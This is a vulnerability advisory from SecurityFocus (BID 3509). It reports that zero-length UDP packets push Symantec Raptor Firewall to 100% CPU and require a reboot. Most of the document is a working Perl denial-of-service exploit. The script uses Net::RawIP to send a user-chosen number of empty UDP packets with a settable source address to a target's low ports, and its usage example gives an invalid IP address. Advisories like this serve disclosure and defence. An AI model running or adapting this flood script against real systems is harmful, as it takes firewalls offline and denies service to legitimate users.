source: http://www.securityfocus.com/bid/3509/info

Raptor Firewall is a commercially available firewall implementation distributed by Symantec.

A problem with the handling of UDP packets by the firewall has been discovered. When the firewall receives zero length UDP packets, the machine hosting the firewall becomes processor bound, with the firewall taking 100% of the CPU.

This makes it possible for a remote user to crash the firewall, denying service to legitimate users of network resources. A reboot is required for the system to resume normal operation. 

#!/usr/bin/perl 
###################################
# This Code is for education only #
###################################
# Greetings to kitchen from #perl on irc openproject.net
# For the help on some perl questions.
# Firewalls are hard on the outside and crunchy on the inside
#
# The Rapor Firewall UDP-GSP (UDP-Proxy) gets 100% CPU load
# When getting UDP-Packets with no Data init
#
# Written 21.Jun 2001 by Max Moser mmo@remote-exploit.org 
#
# http://www.remote-exploit.org
# 

use Net::RawIP;
use Getopt::Long;

GetOptions('src=s','dst=s','num=i');

if (!$opt_src | !$opt_dst | !$opt_num ){
	print "\nUsage parameters for ".$0.":\n";
	print "\t--src\t IP-Sourceaddress\n";
	print "\t--dst\t IP-Destinationaddress\n";
	print "\t--num\t Numer of UDP packets to send\n";
	print "\nExample:\n";
	print "\t".$0." --src=192.168.0.1 --dst=192.168.0.354 --num=1000\n\n\n";
	exit(1);
};

# Some defines
$| = 1;
@anim= ("\\","|","/","-","\\","|","/","-");
$source=$opt_src;
$destination=$opt_dst;
$numpack=$opt_num;

print "\n\n\tSending packets now  ";
for($x=0;$x<$numpack;$x=$x+1){
	my $sport=(rand(65534)+1);
	my $dport=(rand(1024)+1);
	my $c=new Net::RawIP({udp=>{source=>$sport,dest=>$dport}});
        $c->set({ip=>{saddr=>$source,daddr=>$destination},{udp}});
        $c->send;
        undef $c;
	for ($y=0;$y<8;$y=$y+1){
		print "\b" . $anim[$y];
		select (undef,undef,undef,0.01);
		if ($y==8){ $y=0};  	
	};
};

print "\n\n\nSuccessfully sent ".$numpack." packets to ". $destination . "\n\n";